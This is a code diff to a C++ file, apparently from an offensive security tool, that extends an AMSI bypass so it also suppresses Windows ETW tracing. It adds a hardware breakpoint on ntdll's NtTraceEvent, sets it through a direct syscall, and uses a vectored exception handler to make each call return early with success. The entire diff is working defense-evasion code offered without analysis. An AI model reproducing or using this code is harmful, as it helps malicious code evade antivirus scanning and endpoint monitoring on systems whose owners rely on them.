@@ -1,4 +1,4 @@
-#include "amsi_bypass.hpp"
+#include "amsi_etw_bypass.hpp"
 #include "../core/asm/asm_functions.h"
 #include "../core/pe_peb_parser.hpp"
 #include <atomic>
@@ -12,10 +12,12 @@
 namespace {
 fnamsiscanbuffer g_amsiscanbuffer = NULL;
 fnamsiscanstring g_amsiscanstring = NULL;
+fnnttraceevent g_nttraceevent = NULL;
 PVOID g_vehhandle = NULL;
 std::atomic<BOOL> g_running{TRUE};
 std::atomic<LONG> g_haveamsibuf{0};
 std::atomic<LONG> g_haveamsistring{0};
+std::atomic<LONG> g_haventtraceevent{0};
 } // namespace
 PVOID g_SyscallAddress = NULL;
 DWORD g_SyscallNumber = 0;
@@ -68,6 +70,12 @@ BOOL set_hwbp_on_thread(std::vector<VX_TABLE_ENTRY> &vx) {
     ctx.Dr7 &= ~((DWORD64)3 << 20);
     ctx.Dr7 &= ~((DWORD64)3 << 22);
   }
+  if (g_nttraceevent) {
+    ctx.Dr2 = (DWORD64)(ULONG_PTR)g_nttraceevent;
+    ctx.Dr7 |= (1 << 4);
+    ctx.Dr7 &= ~((DWORD64)3 << 24);
+    ctx.Dr7 &= ~((DWORD64)3 << 26);
+  }
   g_SyscallAddress = vx[0].pAddress;
   g_SyscallNumber = vx[0].wSystemCall;
   call_syscall4((PVOID)&ctx, (PVOID)FALSE, NULL, NULL);
@@ -108,11 +116,18 @@ LONG WINAPI veh(PEXCEPTION_POINTERS ep) {
     g_haveamsistring.fetch_add(1);
     return EXCEPTION_CONTINUE_EXECUTION;
   }
-
+  if (g_nttraceevent && excaddr == (DWORD64)(ULONG_PTR)g_nttraceevent) {
+    ep->ContextRecord->Rax = 0;
+    ep->ContextRecord->Rip = *(DWORD64 *)rsp;
+    ep->ContextRecord->Rsp = rsp + 8;
+    ep->ContextRecord->Dr6 &= ~0xF;
+    g_haventtraceevent.fetch_add(1);
+    return EXCEPTION_CONTINUE_EXECUTION;
+  }
   return EXCEPTION_CONTINUE_SEARCH;
 }
 
-VOID amsi_bypass() {
+VOID amsi_etw_bypass() {
   HMODULE hamsi = GetModuleHandleW(L"amsi.dll");
   if (!hamsi) {
     hamsi = LoadLibraryW(L"amsi.dll");
@@ -120,7 +135,11 @@ VOID amsi_bypass() {
   if (!hamsi) {
     return;
   }
-
+  PVOID ntdll_base = get_base(L"ntdll.dll");
+  if (ntdll_base) {
+    g_nttraceevent =
+        (fnnttraceevent)GetProcAddress((HMODULE)ntdll_base, "NtTraceEvent");
+  }
   g_amsiscanbuffer = (fnamsiscanbuffer)GetProcAddress(hamsi, "AmsiScanBuffer");
   g_amsiscanstring = (fnamsiscanstring)GetProcAddress(hamsi, "AmsiScanString");
 
